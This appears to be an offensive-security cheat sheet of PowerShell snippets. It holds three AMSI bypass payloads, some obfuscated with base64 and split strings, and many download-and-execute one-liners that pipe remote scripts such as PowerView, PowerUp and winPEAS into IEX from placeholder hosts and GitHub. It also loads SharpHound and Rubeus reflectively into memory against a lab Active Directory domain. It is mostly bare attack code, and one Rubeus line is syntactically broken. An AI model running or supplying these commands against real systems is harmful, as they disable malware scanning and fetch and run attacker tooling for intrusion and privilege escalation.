AMSI payload 1:

```bash
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

AMSI payload 2

```bash
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

AMSI payload 3

```bash
class TrollAMSI{static [int] M([string]$c, [string]$s){return 1}}[System.Runtime.InteropServices.Marshal]::Copy(@([System.Runtime.InteropServices.Marshal]::ReadIntPtr([long]([TrollAMSI].GetMethods() | Where-Object Name -eq 'M').MethodHandle.Value + [long]8)),0, [long]([Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls').GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq ScanContent).MethodHandle.Value + [long]8,1)
```

Or load into memory:

```
(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/amsi{$}.txt') | IEX
```

This works quite well:

```bash
(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/anonymous300502/Nuke-AMSI/refs/heads/main/NukeAMSI.ps1') | IEX
```

## Load into Memory 

### PowerShell

PowerUp.ps1

```bash
(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/PowerUp.ps1') | IEX; Invoke-HostRecon
```

```bash
(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1') | IEX; Invoke-HostRecon
```

HostRecon.ps1

```bash
(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/HostRecon.ps1') | IEX; Invoke-HostRecon
```

```bash
(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/dafthack/HostRecon/refs/heads/master/HostRecon.ps1') | IEX; Invoke-HostRecon
```

 PowerView.ps1

```bash
(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/PowerView.ps1') | IEX
```

```bash
(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/dev/Recon/PowerView.ps1') | IEX
```

 Powermad.ps1

```bash
(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/Powermad.ps1') | IEX
```

```bash
(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1') | IEX

```

WinPEAS.ps1

```bash
(New-Object System.Net.WebClient).DownloadString('http://x.x.x.x/winPEAS.ps1') | IEX
```

```bash
(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1') | IEX
```

#### Windows Executables

Shaphound.exe:

```bash
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1/SharpHound.exe') 
$assem = [System.Reflection.Assembly]::Load($data);
[Sharphound.Program]::Main("-d north.sevenkingdoms.local -c all".Split());
```

Rubeus.exe:

```bash
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8080/Rubeus.exe') 
$assem = [System.Reflection.Assembly]::Load($data);
Rubeus.Program]::MainString("triage");
```

